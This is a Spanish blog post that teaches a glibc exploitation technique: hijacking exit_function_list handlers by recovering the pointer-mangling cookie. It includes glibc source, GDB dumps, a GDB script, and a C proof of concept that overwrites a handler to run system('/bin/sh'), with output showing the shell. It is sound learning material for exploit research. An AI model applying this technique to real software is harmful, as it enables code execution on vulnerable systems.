---
layout: post-linenums
title: "Ejecución de código parte 1: de exit to system"
author: "Nox"
description: "Ejecutar system al terminar la ejecución del programa"
keywords: "pwn, exploiting"
date: 2024-06-11 00:00:00 -0500
categories: exploiting 
lang: es
lang-ref: code-exec-part1-from-exit-to-sytem
---

Después de un largo retiro del reversing y pwning, estoy volviendo al ruedo, mi mente va poco a poco acostumbrándose al tragín y le está gustando. Recuerdo con buenas épocas mi época en que jugaba todo los fines de semana CTF con el equipo amn3s1a aunque cuando inicié no resolvía casi ningún reto, lo disfrutaba y aprendí que mi mente se volvía "cada vez más rápida", cada fin de semana que volvía a jugar. Muchas cosas han cambiado desde aquel 2013 jugando con mi equipo, sobre todo porque profesionalmente estuve haciendo durante años exploiting de Windows kernel, sumado a que ahora estoy intentando cambiar de target para linux/*os. Así que intentaré aprender las técnicas que se están usando hoy en día aunque llevan décadas de conocidas, y esta es una de ellas.

<!--more-->

Desde que la versión >=2.24 de la glibc removieron `__realloc_hook`, `__memalign_hook`, `__malloc_hook`, `__free_hook` las que permitían poder ejecutar casi cualquier función sobreescribiéndola, se ha tenido que ir buscando nuevos caminos para poder ejecutar código, y este es el caso de la función `exit()` o el `return` que se ejecuta al terminar la ejecución del programa. 

Los siguientes métodos están siendo probadados en glibc 2.35 y 2.39 (qué es la última hasta el momento 05/2024). Por supuesto yo no creé estos métodos, y son antigüos, pero funciona hasta ahora así que les dejo las referencias, [aquí][1] y [aquí][2]. ¡Claro!, agregaré lo que aprendí en la investigación y comentaré algunos escenarios en que pueden ser usados.

### Ejecución de código a través de `exit_function_list`

En este post hablaremos de un método que pueden user usados dentro de la función `__run_exit_handlers()`, la estructura `exit_function_list`, también existe otra `tls_dtor_list`, pero la dejaremos para un futuro post. Pero primero, hablemos de cómo llegamos a la función que decora este subtítulo.

Durante el proceso de salida de un programa, que puede ser ocacionado por llamar a la función `exit()` o el `return` del _main thread_, se ejecuta por la glibc entre otras cosas la función `__run_exit_handlers()` que llamará a cualquier destructor registrado, también llamado `dtors`.

[`exit()`][3] solo es un envoltorio para `__run_exit_handlers()`

```c
void
exit (int status)
{
  __run_exit_handlers (status, &__exit_funcs, true, true);
}
libc_hidden_def (exit)
```

[`__run_exit_handlers`][4] luce así

```c
/* Call all functions registered with `atexit' and `on_exit',
   in the reverse of the order in which they were registered
   perform stdio cleanup, and terminate program execution with STATUS.  */
void
attribute_hidden
__run_exit_handlers (int status, struct exit_function_list **listp,
		     bool run_list_atexit, bool run_dtors)
{
  /* First, call the TLS destructors.  */
  if (run_dtors)
    call_function_static_weak (__call_tls_dtors);

  __libc_lock_lock (__exit_funcs_lock);

  /* We do it this way to handle recursive calls to exit () made by
     the functions registered with `atexit' and `on_exit'. We call
     everyone on the list and use the status value in the last
     exit (). */
  while (true)
    {
      struct exit_function_list *cur;

    restart:
      cur = *listp;

      if (cur == NULL)
	{
	  /* Exit processing complete.  We will not allow any more
	     atexit/on_exit registrations.  */
	  __exit_funcs_done = true;
	  break;
	}

      while (cur->idx > 0)
	{
	  struct exit_function *const f = &cur->fns[--cur->idx];
	  const uint64_t new_exitfn_called = __new_exitfn_called;

	  switch (f->flavor)
	    {
	      void (*atfct) (void);
	      void (*onfct) (int status, void *arg);
	      void (*cxafct) (void *arg, int status);
	      void *arg;

	    case ef_free:
	    case ef_us:
	      break;
	    case ef_on:
	      onfct = f->func.on.fn;
	      arg = f->func.on.arg;
	      PTR_DEMANGLE (onfct);

	      /* Unlock the list while we call a foreign function.  */
	      __libc_lock_unlock (__exit_funcs_lock);
	      onfct (status, arg);
	      __libc_lock_lock (__exit_funcs_lock);
	      break;
	    case ef_at:
	      atfct = f->func.at;
	      PTR_DEMANGLE (atfct);

	      /* Unlock the list while we call a foreign function.  */
	      __libc_lock_unlock (__exit_funcs_lock);
	      atfct ();
	      __libc_lock_lock (__exit_funcs_lock);
	      break;
	    case ef_cxa:
	      /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
		 we must mark this function as ef_free.  */
	      f->flavor = ef_free;
	      cxafct = f->func.cxa.fn;
	      arg = f->func.cxa.arg;
	      PTR_DEMANGLE (cxafct);

	      /* Unlock the list while we call a foreign function.  */
	      __libc_lock_unlock (__exit_funcs_lock);
	      cxafct (arg, status);
	      __libc_lock_lock (__exit_funcs_lock);
	      break;
	    }

	  if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))
	    /* The last exit function, or another thread, has registered
	       more exit functions.  Start the loop over.  */
	    goto restart;
	}

      *listp = cur->next;
      if (*listp != NULL)
	/* Don't free the last element in the chain, this is the statically
	   allocate element.  */
	free (cur);
    }

  __libc_lock_unlock (__exit_funcs_lock);

  if (run_list_atexit)
    call_function_static_weak (_IO_cleanup);

  _exit (status);
}
```

Al principio de la función en la línea **11** se llama a la función `__call_tls_dtors` en el caso de que haya destructores registrados - más adelante hablaremos de ello -, después encontramos un switch y nos fijaremos el `case ef_cxa:` en la línea **68**, ¿por qué?, de eso hablaremos a continuación.

#### Abusando de `exit_function_list` 
Al entrar a la función `__run_exit_handlers`, uno de sus parámetros es un puntero de puntero de la estructura `exit_function_list`, que después de recorrerla se obtiene un puntero a una función y un argumento de la estructura `exit_function` dependiendo del `case` ya que la estructura contiene `unions`.

Véamos un poco la cabecera [`exit.h`][5]

```
enum
{
  ef_free,	/* `ef_free' MUST be zero!  */
  ef_us,
  ef_on,
  ef_at,
  ef_cxa
};

struct exit_function
  {
    /* `flavour' should be of type of the `enum' above but since we need
       this element in an atomic operation we have to use `long int'.  */
    long int flavor;
    union
      {
	void (*at) (void);
	struct
	  {
	    void (*fn) (int status, void *arg);
	    void *arg;
	  } on;
	struct
	  {
	    void (*fn) (void *arg, int status);
	    void *arg;
	    void *dso_handle;
	  } cxa;
      } func;
  };
struct exit_function_list
  {
    struct exit_function_list *next;
    size_t idx;
    struct exit_function fns[32];
  };
```

Si creamos un simple programa que solamente imprima un "Hola mundo!", e inspeccionamos la memoria para ver el contenido `__exit_funcs`, que felizmente tenemos un símbolo para poder localizarlo, observamos lo siguiente:

```
gef> x/10xg __exit_funcs
0x7ffff7e1bf00 <initial>:	    0x0000000000000000	0x0000000000000001
0x7ffff7e1bf10 <initial+16>:	0x0000000000000004	0x5b75ba599d12cfac
0x7ffff7e1bf20 <initial+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7e1bf30 <initial+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7e1bf40 <initial+64>:	0x0000000000000000	0x0000000000000000
```

Recordemos que `initial` contiene la estructura `exit_function_list` y no está el símbolo de esta última - que es una estructura - por defecto en GDB, pero sí de la estructura `exit_function`, ¡y puede haber hasta 32 estructuras!, pero en este caso solo tenemos una. Así que hemos verificado que en un simple programa ya existe una entrada `exit_function_list.fns[0]`. Recorrámosla un poco.

```
gef> p ((struct exit_function*)0x7ffff7e1bf10)->func.cxa
$1 = {
  fn = 0x5b75ba599d12cfac,
  arg = 0x0,
  dso_handle = 0x0
}
gef> p ((struct exit_function*)0x7ffff7e1bf10)->flavor 
$2 = 0x4
```

Hay que denotar en la línea **7** del `enum` de la cabecera en `exit.h` está el campo `ef_cxa` y su valor es 4 que es justo lo que tenemos en `flavor`, y en el puntero de la función `exit_function.func.cxa.fn` no hay una dirección virtual válida. Volvamos a ver el código que esto representa en la función `__run_exit_handlers`.

<pre>
<code class="hljs language-c" data-ln-start-from="67">
        case ef_cxa:
	      /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
		 we must mark this function as ef_free.  */
	      f->flavor = ef_free;
	      cxafct = f->func.cxa.fn;
	      arg = f->func.cxa.arg;
	      PTR_DEMANGLE (cxafct);

	      /* Unlock the list while we call a foreign function.  */
	      __libc_lock_unlock (__exit_funcs_lock);
	      cxafct (arg, status);
	      __libc_lock_lock (__exit_funcs_lock);
	      break;
</code>
</pre>


Antes de que se llame a la función, en la línea **74** se utiliza una macro llamada `PTR_DEMANGLE`, y solo después se llama a la función. Básicamente el par `PTR_MANGLE` y `PTR_DEMANGLE` cifran y decifran el puntero respectivamente. Podemos ver la macro o algo más sencillo, mirar el desensamblado donde es usado, y para ello podemos dar click en la macro `PTR_MANGLE` en el [código][6], así como `PTR_DEMANGLE`, donde veremos en qué lugares están siendo usados.

Entre otras funciones, podemos ver la implementación del código de `PTR_MANGLE` en la función [`__cxa_atexit`][7] y `PTR_DEMANGLE` en la función que hemos estado viendo, `__run_exit_handlers`.

```c
int
__cxa_atexit (void (*func) (void *), void *arg, void *d)
{
  return __internal_atexit (func, arg, d, &__exit_funcs);
}
```
Y una parte de la función `__internal_atexit` es lo siguiente

```c
  PTR_MANGLE (func);
  new->func.cxa.fn = (void (*) (void *, int)) func;
  new->func.cxa.arg = arg;
  new->func.cxa.dso_handle = d;
  new->flavor = ef_cxa;
```

Y su desensamblado

<pre>
<code class="hljs language-x86asm" data-highlighted="yes">   0x00007ffff7c45915 <+85>:	mov    QWORD PTR [rax],0x4
   0x00007ffff7c4591c <+92>:	mov    rdi,rbx
   0x00007ffff7c4591f <+95>:	xor    rdi,QWORD PTR fs:0x30
   0x00007ffff7c45928 <+104>:	rol    rdi,0x11
   0x00007ffff7c4592c <+108>:	movups XMMWORD PTR [rax+0x10],xmm2
   0x00007ffff7c45930 <+112>:	mov    QWORD PTR [rax+0x8],rdi
</code>
</pre>

Las líneas no corresponden exactamente, pero te diré cuáles sí. La línea 1 del desensamblado corresponde a la línea 5 del código en C, donde se establece el `flavor` del cuál hablamos antes; la línea 1 del código en C corresponde a a las líneas 2,3,4 y 6 del desensamblado, que es lo que nos interesa. 

Para `PTR_DEMANGLE` tenemos la función `__run_exit_handlers` que vimos antes.

```
   0x00007ffff7c454bf <+303>:	ror    rax,0x11
   0x00007ffff7c454c3 <+307>:	xor    rax,QWORD PTR fs:0x30
   0x00007ffff7c454cc <+316>:	xchg   DWORD PTR [r14],edx
   0x00007ffff7c454cf <+319>:	cmp    edx,0x1
   0x00007ffff7c454d2 <+322>:	jg     0x7ffff7c45580 <__run_exit_handlers+496>
   0x00007ffff7c454d8 <+328>:	call   rax
```

Entonces la diferencia entre el cifrado y el decifrado es el uso de `rol` y `ror` respectivamente. De todas maneras, hay algo interesante que ya habrán notado, y es el uso de `fs:[0x30]` en las dos operaciones, ¿qué es?, en Linux el segmento `fs` es usado como Thread Local Storage (TLS) y contiene información en tiempo de ejecución del _thread_ actual. La versión [glibc 2.39][8] hace refencia a  `__pointer_chk_guard_local`, pero en la versión [2.26][9] también se especifica a `tbchead_t.ptr_guard`.

```c
typedef struct
{
  void *tcb;		/* Pointer to the TCB.  Not necessarily the
			   thread descriptor used by libpthread.  */
  dtv_t *dtv;
  void *self;		/* Pointer to the thread descriptor.  */
  int multiple_threads;
  int gscope_flag;
  uintptr_t sysinfo;
  uintptr_t stack_guard;
  uintptr_t pointer_guard;
  unsigned long int vgetcpu_cache[2];
# ifndef __ASSUME_PRIVATE_FUTEX
  int private_futex;
# else
  int __glibc_reserved1;
# endif
  int __glibc_unused1;
  /* Reservation of some values for the TM ABI.  */
  void *__private_tm[4];
  /* GCC split stack support.  */
  void *__private_ss;
  long int __glibc_reserved2;
  /* Must be kept even if it is no longer used by glibc since programs,
     like AddressSanitizer, depend on the size of tcbhead_t.  */
  __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));

  void *__padding[8];
} tcbhead_t;
```

Ahora veamos la memoria que apunta `fs`

```
      0x7ffff7fa4740|+0x0000|+000: 0x00007ffff7fa4740  ->  [loop detected]
      0x7ffff7fa4748|+0x0008|+001: 0x00007ffff7fa5160  ->  0x0000000000000001
      0x7ffff7fa4750|+0x0010|+002: 0x00007ffff7fa4740  ->  [loop detected]
      0x7ffff7fa4758|+0x0018|+003: 0x0000000000000000
      0x7ffff7fa4760|+0x0020|+004: 0x0000000000000000
      0x7ffff7fa4768|+0x0028|+005: 0x38c19d513064ee00  <-  canary
      0x7ffff7fa4770|+0x0030|+006: 0x67d652452ad05ec9  <-  PTR_MANGLE cookie
```

Así que, la _key_ para el cifrado y decifrado de los punteros es una _cookie_,llamado `__pointer_chk_guard_local` o `pointer_guard`, y se guarda en `fs:[0x30]`. Según lo que hemos visto, podemos concluir las siguientes fórmulas de `PTR_MANGLE` y `PTR_DEMANGLE`.
fu
```python
ptr_demangle = lambda ptr_enc : ror(ptr_enc, 0x11) ^ cookie 
ptr_mangle = lambda ptr: rol(ptr ^ cookie, 0x11)
```

Afortunadamente tenemos una entrada en `exit_function_list.fns[0]` al parecer, por defecto. Volvamos a verlo

```
gef> x/10xg __exit_funcs
0x7ffff7e1bf00 <initial>:	    0x0000000000000000	0x0000000000000001
0x7ffff7e1bf10 <initial+16>:	0x0000000000000004	0x5b75ba599d12cfac
0x7ffff7e1bf20 <initial+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7e1bf30 <initial+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7e1bf40 <initial+64>:	0x0000000000000000	0x0000000000000000
gef> p ((struct exit_function*)0x7ffff7e1bf10)->func.cxa
$1 = {
  fn = 0x5b75ba599d12cfac,
  arg = 0x0,
  dso_handle = 0x0
}
gef> p ((struct exit_function*)0x7ffff7e1bf10)->flavor 
$2 = 0x4
```

Entonces usemos la _cookie_ y el valor de `exit_function_list.fns[0].func.cxa.fn` que es `0x5b75ba599d12cfac` para descifrar y obtener el puntero.

```
In [4]: cookie = 0x67d652452ad05ec9
In [5]: hex(ptr_demangle(0x5b75ba599d12cfac))
Out[5]: '0x7ffff7fc9040'
```

```
gef> x 0x7ffff7fc9040
0x7ffff7fc9040 <_dl_fini>:	0xe5894855fa1e0ff3
```

Para poder automatizar esta búsqueda, y confirmar que la función `_dl_fini` es la que se encuentra como primer item, se puede usar el siguiente código de python con GDB de la siguiente manera `gdb /bin/ls -batch -ex 'source gdb.py'`

```python
import gdb
import sys

is64 = True if gdb.lookup_type('void').pointer().sizeof ==8 else False
data_sz = 8 if is64 else 4
bits_deep = 64 if is64 else 32

def ror64(x, n):
    return ((x >> n) | (x << (64 - n))) & (1 << 64) - 1

def decrypt(ptr, key):
    return ror64(ptr, 0x11) ^ key

c = lambda : gdb.execute('c')
r = lambda : gdb.execute('r')
q = lambda : gdb.execute('q')

def get_eval(x):
    try:
        return gdb.parse_and_eval(f'{x}')
    except Exception as e:
        print("Error found: ", e)
        return None

def set_bp(addr):
    return gdb.Breakpoint(f'{addr}')

def read_memory(addr, size):
    return gdb.selected_inferior().read_memory(addr, size)

def execute(cmd):
    return gdb.execute(f'{cmd}')

def main():
    bp = set_bp('exit')
    r()

    ptr_guard = get_eval('*(void**)($fs_base+0x30)') # key
    if ptr_guard is None:
        q()
        print('Was not possible to get ptr_guard')
        return

    ptr_guard = int(ptr_guard)

    __exit_funcs_addr = get_eval('__exit_funcs')
    if __exit_funcs_addr is None:
        q()
        print('__exit_funcs exist?')
        return
    __exit_funcs_addr = int(__exit_funcs_addr)

    print('ptr_guard 0x%x' % ptr_guard)
    print('__exit_funcs_addr 0x%x' % __exit_funcs_addr)

    """
struct exit_function_list
  {
    struct exit_function_list *next;
    size_t idx;
    struct exit_function fns[32];
  };
    """

    dummy_addr = __exit_funcs_addr + data_sz
    idx = int.from_bytes(read_memory(dummy_addr, data_sz), 'little')
    fns_size = gdb.lookup_type('struct exit_function').sizeof
    dummy_addr += data_sz

    for _ in range(idx):
        val = f'((struct exit_function*){dummy_addr})->flavor'
        flavor = int(get_eval(val))

        val = f'((struct exit_function*){dummy_addr})->func.cxa.fn'
        fn = int(get_eval(val))

        addr = decrypt(fn, ptr_guard)
        sym = gdb.execute(f'info sym {addr}', to_string=True)
        if "No symbol" in sym:
            print(f'flavor: {flavor}, fn: 0x{addr:x}')
        else:
            print(f'flavor: {flavor}, fn: 0x{addr:x} <{sym.split()[0]}>')

        dummy_addr += fns_size

if __name__ == '__main__':
    main()
```


```
$ sudo gdb /bin/ls -batch -ex 'source gdb.py'
Breakpoint 1 at 0x4c20
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, __GI_exit (status=0) at ./stdlib/exit.c:142
142	./stdlib/exit.c: No such file or directory.

ptr_guard 0x24278a4b62350122
__exit_funcs_addr 0x7ffff7e1bf00
flavor: 4, fn: 0x7ffff7fc9040 <_dl_fini>
flavor: 4, fn: 0x55555555fa80
```

#### Posibles ataques

Lo que hemos visto hasta este punto es realmente interesante. Como preámbulo puedo decir que una técnica común usada en el desarrollo de un exploit es obtener una fuga de memoria con alguna dirección virtual perteneciente de la `glibc` y/o de `ld`, permitiendo calcular la dirección virtual de la función de `__exit_funcs` y `_dl_fini`, aunque esta última pertence a `ld`. Entonces, obteniendo el puntero cifrado y decifrado podremos obtener la _cookie_. 

```python
In [9]: hex(ror64(0x5b75ba599d12cfac, 0x11) ^ 0x7ffff7fc9040)
Out[9]: '0x67d652452ad05ec9'
```

Obtener la _cookie_ nos permite poder cifrar cualquier puntero como el de la función `system`, y con una primitiva de escritura sobreescribir el puntero modificado, a su vez que en `exit_function_list.fns[0].cxa.arg` se escriba `/bin/sh` para poder obtener una shell.

```c
    printf("ld = %p\n", ld_addr);
    printf("libc = %p\n", libc_addr);

    struct exit_function_list* exit_funcs_list = (struct exit_function_list*)(libc_addr + 0x21bf00);
    printf("__exit_funcs = %p\n", exit_funcs_list);

    uint64_t _dl_fini_addr = (uint64_t)(ld_addr + 0x5b040);

    //uint64_t cookie = (*(uint64_t*)(ld_addr + 0x8f040)) - 0x53b70;
    uint64_t cookie = (uint64_t)(ld_addr + 0x3c740 + 0x30);

    cookie = *(uint64_t*)cookie;
    printf("cookie = 0x%lx\n", cookie);

    uint64_t fn = (uint64_t)exit_funcs_list->fns[0].func.cxa.fn;
    printf("_dl_fini encrypted = 0x%lx\n", fn);
    printf("_dl_fini decrypted = 0x%lx\n", _dl_fini_addr);

    uint64_t cookie2 = decrypt(fn, _dl_fini_addr);
    printf("cookie2 = 0x%lx\n", cookie2);

    assert(cookie == cookie2);

    uint64_t ptr_enc = encrypt((uint64_t)system, cookie2);
    printf("ptr_enc 0x%lx\n", ptr_enc);
    printf("system %p\n", system);

    exit_funcs_list->fns[0].func.cxa.fn = (void*)ptr_enc;
    exit_funcs_list->fns[0].func.cxa.arg = "/bin/sh";

    // trigger system("/bin/sh");
    return 0;
```

```
$ ./a.out 
Mama am here!
ld = 0x723f9c2b5000
libc = 0x723f9c000000
__exit_funcs = 0x723f9c21bf00
ptr cookie 0x723f9c2f1770
cookie = 0x9702d9c5fe9e5e08
_dl_fini encrypted = 0x57f4c55ebc912e05
_dl_fini decrypted = 0x723f9c310040
cookie2 = 0x9702d9c5fe9e5e08
ptr_enc 0x57f4c536a6f12e05
system 0x723f9c050d70
$ echo 'pwn'
pwn
$ 
```

Pueden ver que estoy usando la dirección virtual de `ld`, pero a veces con un _leak_ de `glibc` es suficiente porque se suele alojar adyacente, y realizando un _bruteforce_ se puede obtener la ejecución satisfactoria. Entonces emulo los _leaks_ necesarios para obtener `_dl_fini` y el valor `exit_function_list.fns[0].cxa.fn` para calcular la _cookie_, después ciframos el puntero de `system`, sobreescribimos el argumento en `exit_function_list.fns[0].cxa.arg` con `"/bin/sh"` y terminamos la ejecución a través de `exit` o el `return` del hilo principal.

Otro de los posibles ataques es sobreescribir la _cookie_ con byte nulos, esto nos evita leer el valor de `exit_function_list.fns[n].cxa.fn` con el objetido de obtener la _cookie_ como lo acabamos de ver, sino que podemos usar la dirección virtual de `system`  y hacer un `rol 0x11`, entonces cuando se ejecute `PTR_DEMANGLE` usará la _cookie_ nula, la decifrará haciendo `ror 0x11` y ejecutará el puntero de la función que hemos colocado previamente.

Por supuesto siempre se puede crear una estructura falsa de `exit_functions_list` si es que tenemos las primitivas para hacerlo.

Cómo se ha mostrado en el código anterior se obtiene la dirección de la _cookie_ a través de TLS que se encuentra en `fs:[0x30]` con la línea 10. ¿Cómo lo hacemos?, veámoslo.

El linker `ld` tiene un variable global [`__nptl_rtld_global`][10] que apunta a la variable global `_rtld_global`, que finalmente apunta a una estructura [`rtld_global`][11], y su primer campo es `_ns_loaded` o directamente usar la dirección `ld` como base y sumar del offset TLS como es el método que se ha usado en la línea 10. Por su puesto, siempre se puede intentar usar la dirección virtual de la `glibc` con un _bruteforce_ de ejecuciones para que el offset calce.

```
[...]
0x00007ffff7e16000 0x00007ffff7e1a000 0x0000000000004000 0x0000000000215000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7e1a000 0x00007ffff7e1c000 0x0000000000002000 0x0000000000219000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7e1c000 0x00007ffff7e29000 0x000000000000d000 0x0000000000000000 rw- 
0x00007ffff7fa4000 0x00007ffff7fa7000 0x0000000000003000 0x0000000000000000 rw- <tls-th1>
```


> Escrito por **Nox**

[1]: https://googleprojectzero.blogspot.com/2014/08/the-poisoned-nul-byte-2014-edition.html
[2]: https://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html
[3]: https://elixir.bootlin.com/glibc/glibc-2.39/source/stdlib/exit.c#L135
[4]: https://elixir.bootlin.com/glibc/glibc-2.39/source/stdlib/exit.c#L35
[5]: https://elixir.bootlin.com/glibc/glibc-2.39/source/stdlib/exit.h
[6]: https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/unix/sysv/linux/x86_64/pointer_guard.h#L25
[7]: https://elixir.bootlin.com/glibc/glibc-2.39/source/stdlib/cxa_atexit.c#L52
[8]: https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/unix/sysv/linux/x86_64/pointer_guard.h#L29
[9]: https://elixir.bootlin.com/glibc/glibc-2.26/source/sysdeps/x86_64/nptl/tls.h#L70
[10]: https://elixir.bootlin.com/glibc/glibc-2.39/source/nptl/pthread_create.c#L63
[11]: https://elixir.bootlin.com/glibc/glibc-2.39/source/sysdeps/generic/ldsodefs.h#L303
